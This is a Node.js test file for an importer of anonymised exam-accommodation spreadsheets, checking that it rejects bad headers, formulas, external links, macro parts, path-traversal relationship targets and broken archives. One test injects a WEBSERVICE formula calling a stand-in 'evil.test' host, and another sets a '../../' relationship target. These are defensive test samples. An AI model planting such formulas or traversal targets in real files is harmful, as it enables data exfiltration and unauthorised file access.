import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {inflateRawSync} from 'node:zlib';
import {zipStore} from './core.mjs';
import {readAnonymousXlsx,worksheetToTermCsv} from './xlsx-import.mjs';
import {parseTermCourseBatchCsv} from './batch-accommodations.mjs';
const fixture=readFileSync(new URL('./ORNEK-ANONIM-DONEMLI-SINAV-LISTESI.xlsx',import.meta.url));
function unzipNode(bytes){const data=Buffer.from(bytes);let end=-1;for(let p=data.length-22;p>=0;p--)if(data.readUInt32LE(p)===0x06054b50){end=p;break;}
 const count=data.readUInt16LE(end+10),offset=data.readUInt32LE(end+16);let at=offset;const result={};
 for(let i=0;i<count;i++){
  const method=data.readUInt16LE(at+10),comp=data.readUInt32LE(at+20),nl=data.readUInt16LE(at+28),ex=data.readUInt16LE(at+30),cl=data.readUInt16LE(at+32),loc=data.readUInt32LE(at+42);
  const name=data.subarray(at+46,at+46+nl).toString(),start=loc+30+data.readUInt16LE(loc+26)+data.readUInt16LE(loc+28);
  const src=data.subarray(start,start+comp);result[name]=method===8?inflateRawSync(src):src;at+=46+nl+ex+cl;
 }return result;
}
const mutate=(file,fn)=>{const entries=unzipNode(fixture);entries[file]=fn(String(entries[file]));return zipStore(entries);};
test('Örnek gerçek XLSX başlıkları ve anonim kayıtları doğru ayrıştırılır',async()=>{
 const table=await readAnonymousXlsx(fixture);assert.equal(table.length,5);assert.equal(table[0][0],'donem');
 const csv=worksheetToTermCsv(table),rows=parseTermCourseBatchCsv(csv);
 assert.equal(rows.length,4);assert.equal(rows[0].term,'2026-GUZ');assert.equal(rows[3].ready,false);
});
test('Eksik/ek sütun ile tanı başlığı kabul edilmez',()=>{
 assert.throws(()=>worksheetToTermCsv([['ad_soyad','ders_kodu','sinav_etiketi','ogrenci_kodu','gereksinim_alani','onayli_duzenlemeler','ek_sure_dakika','onay_durumu'],['test','BLP103','VIZE','A-001','vision','LARGE_PRINT','5','onayli']]),/Başlıklar/);
 assert.throws(()=>worksheetToTermCsv([['donem','ders_kodu']]),/Başlıklar|satır/i);
});
test('Formül bulunan XLSX bütünüyle reddedilir',async()=>{
 const bytes=mutate('xl/worksheets/sheet1.xml',s=>s.replace('</x:sheetData>','<row r="7"><c r="A7"><f>WEBSERVICE("https://evil.test")</f><v>5</v></c></row></x:sheetData>'));
 await assert.rejects(()=>readAnonymousXlsx(bytes),/Formüllü hücre/);
});
test('Harici ilişki, makro parçası ve zip geçersiz dosya reddedilir',async()=>{
 const entries=unzipNode(fixture);entries['xl/externalLinks/externalLink1.xml']=Buffer.from('<x/>');await assert.rejects(()=>readAnonymousXlsx(zipStore(entries)),/Makro veya dış/);
 const bytes=mutate('xl/_rels/workbook.xml.rels',s=>s.replace('Target="/xl/worksheets/sheet1.xml"','Target="../../other.xml"'));
 await assert.rejects(()=>readAnonymousXlsx(bytes),/geçersiz/);
 await assert.rejects(()=>readAnonymousXlsx(Buffer.from('not a spreadsheet')),/geçersiz/);
});
test('Sadece sınırlandırılmış ve tek satırlı metin kabul edilir',()=>{
 const head=['donem','ders_kodu','sinav_etiketi','ogrenci_kodu','gereksinim_alani','onayli_duzenlemeler','ek_sure_dakika','onay_durumu'];
 assert.throws(()=>worksheetToTermCsv([head,['2026-GUZ','BLP103','VIZE','K-1','vision','LARGE_PRINT','5','onayli;formula']]),/noktalı/);
});
